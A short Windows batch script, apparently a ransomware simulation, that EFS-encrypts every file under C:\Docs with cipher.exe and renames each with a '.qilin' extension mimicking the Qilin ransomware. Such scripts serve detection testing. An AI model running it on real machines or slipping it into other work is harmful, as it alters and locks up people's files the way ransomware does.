@echo off
:: Set target directory
set "target=C:\Docs"

echo [+] Starting file encryption in: %target%
echo.

:: Encrypt all files recursively using cipher.exe
cipher /e /s:"%target%"

:: Rename all files to simulate encrypted extension
for /R "%target%" %%f in (*.*) do (
    ren "%%f" "%%~nxf.qilin"
)
echo.
echo [+] Files encrypted and renamed with .qilin extension.
pause
